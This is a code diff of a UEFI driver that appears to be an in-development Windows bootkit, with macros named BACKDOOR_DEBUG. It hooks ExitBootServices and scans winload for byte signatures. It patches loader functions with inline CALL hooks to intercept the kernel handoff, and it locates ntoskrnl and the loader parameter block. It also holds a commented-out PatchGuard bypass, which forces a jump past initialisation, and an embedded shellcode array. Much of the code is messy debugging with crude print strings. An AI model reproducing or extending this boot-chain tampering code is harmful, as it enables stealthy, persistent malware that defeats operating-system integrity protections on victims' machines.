@@ -6,20 +6,27 @@
 #include <Protocol/SerialIo.h>
 #include <Base.h>
 
+//
+// Shell Library
+//
+#include <Library/DebugLib.h>
+
 #include "drv.h"
 #include "asm.h"
 #include "arc.h"
 #include "utils.h"
 #include "types.h"
-#include "debug.h"
+
 #include "bootloader.h"
 #include "globals.h"
-#include "serial.h"
+
 
 EFI_HANDLE	gImageHandle;
 EFI_SYSTEM_TABLE	*gSystemTable;
 EFI_BOOT_SERVICES	*gBootServices;
 EFI_RUNTIME_SERVICES	*gRuntimeServices;
+
+int j = 0;
 
 #define PAGE_SIZE 0x1000
 //
@@ -45,122 +52,6 @@ EFI_IMAGE_START g_pImageStart = NULL;
 
 void *Base = NULL;
 EFI_IMAGE_NT_HEADERS *pHeaders = NULL;
-PLOADER_PARAMETER_BLOCK blk;
-
-EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL;
-char *m_PendingOutput = NULL;
-EFI_SERIAL_IO_PROTOCOL *m_SerialIo = NULL;
-
-void SerialPrint(char *Message);
-
-PLOADER_PARAMETER_BLOCK my;
-
-BOOLEAN ConsoleInit(void)
-{
-	if (m_PendingOutput == NULL)
-	{
-		EFI_PHYSICAL_ADDRESS PagesAddr;
-
-		// allocate memory for pending debug output
-		EFI_STATUS Status = gBS->AllocatePages(
-			AllocateAnyPages,
-			EfiRuntimeServicesData,
-			1, &PagesAddr
-		);
-		if (EFI_ERROR(Status))
-		{
-			DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
-			return FALSE;
-		}
-
-		m_PendingOutput = (char *)PagesAddr;
-		gBS->SetMem(m_PendingOutput, PAGE_SIZE, 0);
-	}
-
-	return TRUE;
-}
-//--------------------------------------------------------------------------------------
-void SerialPrint(char *Message)
-{
-	UINTN Len = AsciiStrLen(Message), i = 0;
-
-	Print(L"len %lx", Len);
-	AsciiPrint(Message);
-
-#if defined(BACKDOOR_DEBUG_SERIAL_PROTOCOL)
-
-	if (m_SerialIo)
-	{
-		m_SerialIo->Write(m_SerialIo, &Len, Message);
-	}
-
-#elif defined(BACKDOOR_DEBUG_SERIAL_BUILTIN)
-
-	SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);
-
-	for (i = 0; i < Len; i += 1)
-	{
-		// send single byte via serial port
-		SerialPortWrite(SERIAL_PORT_NUM, Message[i]);
-	}
-
-#elif defined(BACKDOOR_DEBUG_SERIAL_OVMF)
-
-	for (i = 0; i < Len; i += 1)
-	{
-		// send single byte to OVMF debug port
-		__outbyte(OVMF_DEBUG_PORT, Message[i]);
-	}
-
-#endif
-
-#if defined(BACKDOOR_DEBUG_SERIAL_TO_CONSOLE)
-
-	if (m_TextOutput == NULL)
-	{
-		if (m_PendingOutput &&
-			strlen(m_PendingOutput) + strlen(Message) < PAGE_SIZE)
-		{
-			// text output protocol is not initialized yet, save output to temp buffer
-			strcat(m_PendingOutput, Message);
-		}
-	}
-	else
-	{
-		ConsolePrint(Message);
-	}
-
-#endif
-
-}
-//--------------------------------------------------------------------------------------
-BOOLEAN SerialInit(VOID)
-{
-
-#if defined(BACKDOOR_DEBUG_SERIAL_PROTOCOL)
-
-	if (m_SerialIo)
-	{
-		// serial I/O is already initialized
-		return TRUE;
-	}
-
-	// TODO: initialize EFI serial I/O protocol
-	// ...
-
-	if (m_SerialIo == NULL)
-	{
-		return FALSE;
-	}
-
-#elif defined(BACKDOOR_DEBUG_SERIAL_BUILTIN)
-
-	SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);
-
-#endif
-
-	return TRUE;
-}
 
 PKLDR_DATA_TABLE_ENTRY GetLoadedModule(LIST_ENTRY* LoadOrderListHead, CHAR16* ModuleName)
 {
@@ -170,8 +61,12 @@ PKLDR_DATA_TABLE_ENTRY GetLoadedModule(LIST_ENTRY* LoadOrderListHead, CHAR16* Mo
 	for (LIST_ENTRY* ListEntry = LoadOrderListHead->ForwardLink; ListEntry != LoadOrderListHead; ListEntry = ListEntry->ForwardLink)
 	{
 		PKLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
 		if (Entry && (StrnCmp(Entry->BaseImageName.Buffer, ModuleName, Entry->BaseImageName.Length) == 0))
+		{
 			return Entry;
+		}
+			
 	}
 
 	return NULL;
@@ -233,8 +128,39 @@ InitializeLib(
 	gBootServices = gSystemTable->BootServices;
 	gRuntimeServices = gSystemTable->RuntimeServices;
 	gBS = gBootServices;
-	gST = gSystemTable;
+	gST = SystemTable;
 	gRT = gRuntimeServices;
+}
+
+VOID
+EFIAPI
+Callback4(
+	IN  EFI_EVENT	Event,
+	IN  VOID      *Context
+)
+{
+	//Print(L"last cb\r\n");
+
+	int i =  2;
+
+	i++;
+	j++;
+	//Print(L"2\r\n");
+	//UtilWaitForKey();
+	
+}
+
+VOID
+EFIAPI
+Callback3(
+	IN  EFI_EVENT	Event,
+	IN  VOID      *Context
+)
+{
+	j++;
+	Print(L"aaaa %d\r\n", j);
+	UtilWaitForKey();
+
 }
 
 
@@ -245,7 +171,7 @@ CallbackSMI(
 	IN  VOID      *Context
 )
 {
-	//CHAR8 *dest = NULL;
+	/*CHAR8 *dest = NULL;
 	//UnicodeStrToAsciiStr(b.Extension->SmbiosVersion.Buffer, dest);
 	
 	//AsciiPrint("%s\r\n", dest);
@@ -274,8 +200,11 @@ CallbackSMI(
 		0x66, 0x67, 0x42, 0x8b, 0x0c, 0x53, 0x67, 0x41, 0x8b, 0x5e, 0x1c, 0x44,
 		0x01, 0xeb, 0x67, 0x8b, 0x04, 0x8b, 0x44, 0x01, 0xe8, 0xc3
 	};
+	*/
 
-	gBS->AllocatePool(EfiRuntimeServicesCode, sizeof(messageBox64bit_sc), (VOID**)&messageBox64bit_sc);
+	//gBS->AllocatePool(EfiRuntimeServicesCode, sizeof(messageBox64bit_sc), (VOID**)&messageBox64bit_sc);
+
+	Print(L"exit bs\r\n");
 }
 
 VOID EFIAPI hkOslArchTransferToKernel(PLOADER_PARAMETER_BLOCK KernelParams, VOID *KiSystemStartup)
@@ -296,6 +225,8 @@ VOID EFIAPI hkOslArchTransferToKernel(PLOADER_PARAMETER_BLOCK KernelParams, VOID
 	UINT32 KernelSize = 0;
 
 	KernelEntry = GetLoadedModule(&KernelParams->LoadOrderListHead, L"ntoskrnl.exe");
+
+
 	if (KernelEntry)
 	{
 		KernelBase = KernelEntry->ImageBase;
@@ -332,9 +263,13 @@ VOID EFIAPI hkOslFwpKernelSetupPhase1(PLOADER_PARAMETER_BLOCK a1)
 
 	oOslFwpKernelSetupPhase1(a1);
 
-	my = a1;
+	//my = a1;
 
-	//__debugbreak();
+	oDbgPrint();
+
+	DebugPrint(0x80000000, "here");
+
+
 }
 
 CHAR16 *
@@ -484,43 +419,45 @@ __int64 hkRtlImageNtHeaderEx(int a1, unsigned __int64 a2, unsigned __int64 a3, u
 		CopyMem((VOID*)OslArchTransferToKernelCallBackup, (VOID*)Found, 5);
 
 		// Do patching 
-		*(UINT8*)Found = 0xE8;
-		*(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset((VOID*)Found, (VOID*)&hkOslArchTransferToKernel);
+		//*(UINT8*)Found = 0xE8;
+		//*(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset((VOID*)Found, (VOID*)&hkOslArchTransferToKernel);
 
-		UINT8* FoundSetup = NULL;
-		EfiStatus = UtilFindPattern(sigOslFwpKernelSetupPhase1, 0xCC, sizeof(sigOslFwpKernelSetupPhase1), (VOID*)a2, (UINT32)a3, (VOID**)&FoundSetup);
 		
-		if (EfiStatus == EFI_SUCCESS)
-		{
-			oOslFwpKernelSetupPhase1 = (tOslFwpKernelSetupPhase1)UtilCallAddress(FoundSetup);
-			OslFwpKernelSetupPhase1PatchLocation = (VOID*)FoundSetup;
-			CopyMem((VOID*)OslFwpKernelSetupPhase1Backup, (VOID*)FoundSetup, 5);
-
-			// Do patching 
-			*(UINT8*)FoundSetup = 0xE8;
-			*(UINT32*)(FoundSetup + 1) = UtilCalcRelativeCallOffset((VOID*)FoundSetup, (VOID*)&hkOslFwpKernelSetupPhase1);
-		}
-		else
-		{
-			Print(L"Failed to find it\r\n");
-			UtilWaitForKey();
-		}
 		//SerialPrint("penis penis penis");
 
-		/*UINT8 sigPrint[] = { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x4B, 0x08, 0x49, 0x89, 0x53, 0x10, 0x4D, 0x89, 0x43, 0x18, 0x4D, 0x89, 0x4B, 0x20, 0x48, 0x83, 0xEC, 0x38 };
+		UINT8 sigPrint[] = { 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0xB9, 0xCC, 0xCC, 0xCC, 0xCC, 0xE8, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x74, 0x43 };
 		UINT8* FoundPrint = NULL;
 		EFI_STATUS findPrint = UtilFindPattern(sigPrint, 0xCC, sizeof(sigPrint), (VOID*)a2, (UINT32)a3, (VOID**)&FoundPrint);
 
 		if (findPrint == EFI_SUCCESS)
 		{
+			Print(L"Found print: %lx\r\n", FoundPrint);
 			oDbgPrint = (tDbgPrint)(FoundPrint);
-			oDbgPrint("testing123\r\b");
-		}*/
+		}
 
 	}
 	else
 	{
 		Print(L"\r\nImgArchEfiStartBootApplication error, failed to find OslArchTransferToKernel patch location. Status: %lx\r\n", EfiStatus);
+	}
+
+	UINT8* FoundSetup = NULL;
+	EfiStatus = UtilFindPattern(sigOslFwpKernelSetupPhase1, 0xCC, sizeof(sigOslFwpKernelSetupPhase1), (VOID*)a2, (UINT32)a3, (VOID**)&FoundSetup);
+
+	if (EfiStatus == EFI_SUCCESS)
+	{
+		oOslFwpKernelSetupPhase1 = (tOslFwpKernelSetupPhase1)UtilCallAddress(FoundSetup);
+		OslFwpKernelSetupPhase1PatchLocation = (VOID*)FoundSetup;
+		CopyMem((VOID*)OslFwpKernelSetupPhase1Backup, (VOID*)FoundSetup, 5);
+
+		// Do patching 
+		*(UINT8*)FoundSetup = 0xE8;
+		*(UINT32*)(FoundSetup + 1) = UtilCalcRelativeCallOffset((VOID*)FoundSetup, (VOID*)&hkOslFwpKernelSetupPhase1);
+	}
+	else
+	{
+		Print(L"Failed to find it\r\n");
+		UtilWaitForKey();
 	}
 
 	//Print(L"call address aga9n %lx\r\n", oRtlImageNtHeaderEx);
@@ -633,7 +570,6 @@ hkImageStart(
 
 EFI_STATUS EFIAPI hkExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
 {
-	Print(L"exit boot %llx\r\n", my);
 	UINTN i = 0;
 
 	// return address points to winload
@@ -678,13 +614,173 @@ EFI_STATUS EFIAPI hkExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
 		{
 			const UINT32 offset = *(UINT32*)(blkAddr + 3);
 
-			PLOADER_PARAMETER_BLOCK PBlock = (PLOADER_PARAMETER_BLOCK)(blkAddr + 7 + offset);
+			// LOADER_PARAMETER_BLOCK *ldrAddress = (LOADER_PARAMETER_BLOCK*)(blkAddr + 7 + offset);
+			//LOADER_PARAMETER_BLOCK ldrAddress = *(LOADER_PARAMETER_BLOCK*)(blkAddr + 7 + offset);
 
-			Print(L"LOADER_PARAMETER_BLOCK @ %llx\r\n", PBlock);
+			Print(L"blkAddr %lx\r\n", blkAddr);
 
-			//LOADER_PARAMETER_BLOCK blk123 = *PBlock;
-	
-			Print(L"Major Version: %lu\r\n", PBlock->OsMajorVersion);
+			const UINT32 *ldrAddress = (UINT32*)(blkAddr + 7 + offset);
+
+			Print(L"Local address %lx\r\n", ldrAddress);
+
+			UINT64 value = *(UINT64*)ldrAddress;
+
+			Print(L"Real address %llx\r\n", value);
+
+			LOADER_PARAMETER_BLOCK **block = (LOADER_PARAMETER_BLOCK**)((UINT32*)ldrAddress);
+
+			Print(L"block %llx %llx\r\n", block, *block);
+
+			EFI_STATUS p = gRT->ConvertPointer(1, block);
+
+			if(p == EFI_SUCCESS)
+				Print(L"block %llx %llx\r\n", block, *block);
+
+
+			PLOADER_PARAMETER_BLOCK jj = &(*(LOADER_PARAMETER_BLOCK*)ldrAddress);
+
+			Print(L"Check em out %llx\r\n", &jj);
+
+			Print(L"Check em out %llx\r\n", jj->OsMajorVersion);
+
+			
+
+			//PLOADER_PARAMETER_BLOCK ldrAddress = (PLOADER_PARAMETER_BLOCK)0x9364F0;
+
+			//LOADER_PARAMETER_BLOCK b;
+			
+			//gBS->CopyMem(&b, (VOID**)&ldrAddress, sizeof(LOADER_PARAMETER_BLOCK));
+
+			//Print(L"my var %lx\r\n", &b);
+
+			// ldrAddress (9A6380) is a pointer that points to the PLOADER_BLOCK in memory (FFF....D0)
+
+			/*UINT64 value = *ldrAddress;
+
+			Print(L"Real struct address: %lx\r\n", value);
+
+			LOADER_PARAMETER_BLOCK *b = NULL;
+
+			b = (LOADER_PARAMETER_BLOCK **)&ldrAddress;
+
+			Print(L"My pointer: %lx, %lx \r\n", b, &b);
+
+			Print(L"shit fucker %lx\r\n", b->OsMajorVersion);
+			*/
+
+
+			//LOADER_PARAMETER_BLOCK **gGlobalPointer = &ldrAddress;
+
+			//Print(L"Loader Address: %llx\r\n", gGlobalPointer);
+			//Print(L"Loader Address: %llx\r\n", &gGlobalPointer);
+
+			//PLOADER_PARAMETER_BLOCK gGlobalPointer = (PLOADER_PARAMETER_BLOCK)ldrAddress;
+
+			//gRT->ConvertPointer(EFI_OPTIONAL_PTR, (VOID **)&b);
+
+			//Print(L"third address %lx\r\n", b->OsMajorVersion);
+
+			//Print(L"done\r\n");
+			//Print(L"Loader Address: %llx\r\n", gGlobalPointer);
+
+			//Print(L"testing: %lu\r\n", ldrAddress.OsMajorVersion);
+
+
+			//UINT64 *addr = (UINT64*)ldrAddress;
+
+			//Print(L"Loader Address 2 : %llx %p %p\r\n", addr, addr, &addr);
+
+
+			//UINT64 value;
+
+			//value = *ldrAddress;
+
+			// value prints the real address!!!
+			//Print(L"Loader Address: %llx\r\n", value);
+
+			//UINT64 *block = (UINT64*)value;
+
+
+			//LOADER_PARAMETER_BLOCK p = *(LOADER_PARAMETER_BLOCK *)value;
+
+			//PLOADER_PARAMETER_BLOCK b = (PLOADER_PARAMETER_BLOCK)p;
+
+			//PLOADER_PARAMETER_BLOCK b = (PLOADER_PARAMETER_BLOCK)(value);
+
+
+			/*int var = 789;
+
+			// pointer for var
+			int *ptr2;
+
+			// double pointer for ptr2
+			int **ptr1;
+
+			// storing address of var in ptr2
+			ptr2 = &var;
+
+			// Storing address of ptr2 in ptr1
+			ptr1 = &ptr2;
+
+
+			LOADER_PARAMETER_BLOCK **p = (PLOADER_PARAMETER_BLOCK)((blkAddr + 7 + offset));
+
+			Print(L"Should be same %llx\r\n", p);
+
+			
+
+			LOADER_PARAMETER_BLOCK **dbl;
+
+			//Print(L"Test: %lu\r\n", (*(&ldrAddress))->OsMajorVersion);
+
+			Print(L"Test: %lu\r\n", (*ldrAddress)->OsMajorVersion);
+
+			dbl = &ldrAddress;
+
+			Print(L"Test 2: %lu\r\n", (*dbl)->OsMajorVersion);
+
+			Print(L"ldr addr %llx\r\n", &ldrAddress->OsMajorVersion);
+
+			Print(L"ldr addr %lu\r\n", ldrAddress->OsMajorVersion);
+			*/
+
+			//PKLDR_DATA_TABLE_ENTRY KernelEntry = NULL;
+			//VOID* KernelBase = NULL;
+			//UINT32 KernelSize = 0;
+
+			//Print(L"loadorder %lx", &PBlock.LoadOrderListHead);
+
+			//__debugbreak();
+
+			//UtilWaitForKey();
+
+			//KernelEntry = GetLoadedModule(&PBlock->LoadOrderListHead, L"ntoskrnl.exe");
+			
+			/*
+			if (KernelEntry)
+			{
+				KernelBase = KernelEntry->ImageBase;
+				KernelSize = KernelEntry->SizeOfImage;
+			}
+
+			if (KernelBase && KernelSize)
+			{
+				//
+				// Find patch guard initialization function
+				//
+				UINT8* Found = NULL;
+				EFI_STATUS Status = UtilFindPattern(sigInitPatchGuard, 0xCC, sizeof(sigInitPatchGuard), KernelBase, KernelSize, (VOID**)&Found);
+				if (Status == EFI_SUCCESS)
+				{
+					InitPatchGuardPatchLocation = (VOID*)Found;
+					//
+					// Patch to force a jump to skip PG initialization
+					//
+					*(UINT8*)Found = 0xEB;
+				}
+			}
+
+
 			UtilWaitForKey();
 
 			//Print(L"Found blk call at %lx\r\n", *(UINT32*)(Found2 + 3));
@@ -713,6 +809,7 @@ EFI_STATUS EFIAPI hkExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
 		
 	}
 
+	Print(L"dedite\r\r\n");
 	gBS->ExitBootServices = g_pOrgExitBootService;
 	
 	return g_pOrgExitBootService(ImageHandle, MapKey);
@@ -754,7 +851,7 @@ UefiMain (
 
 	InitializeLib(ImageHandle, SystemTable);
 
-	SerialInit();
+	//SerialInit();
 
 	
 
@@ -776,8 +873,8 @@ UefiMain (
 
 	EFI_EVENT Event;
 	gBootServices->CreateEventEx(0x200, 0x10, &CallbackSMI, NULL, &EXIT_BOOT_SERVICES_GUID, &Event);
-	//gBootServices->CreateEventEx(0x200, 0x10, &Callback2, NULL, &SMBIOS_TABLE_GUID, &Event);
-	//gBootServices->CreateEventEx(0x200, 0x10, &Callback2, NULL, &CC, &Event);
+	gBootServices->CreateEventEx(0x200, 0x10, &Callback3, NULL, &SMBIOS_TABLE_GUID, &Event);
+
 	
 	g_pOrgExitBootService = gBS->ExitBootServices;
 	gBS->ExitBootServices = _ExitBootServices;
